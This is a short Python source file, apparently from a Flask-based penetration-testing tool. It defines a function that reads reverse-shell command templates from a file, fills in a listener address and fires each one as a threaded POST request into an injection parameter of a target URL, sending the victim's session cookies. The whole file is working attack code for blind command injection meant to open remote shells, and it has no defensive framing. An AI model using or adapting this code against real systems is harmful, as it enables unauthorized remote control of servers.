import requests
import threading
import os

def blindReverseShell(url, injection_parameter, cookies, listenner):
  commands_file = open("flaskr/scripts/reverse_shell.txt", "r").readlines()

  for command in commands_file:
    threading.Thread(target=request, args=(url, injection_parameter, cookies, command.format(listenner))).start()

def request(url, injection_parameter, cookies, command):
  postParams = {
    injection_parameter: command,
    "Submit": "Submit"
  }

  requests.post(url, cookies=cookies, data=postParams, headers={"Content-Type": "application/x-www-form-urlencoded"})
  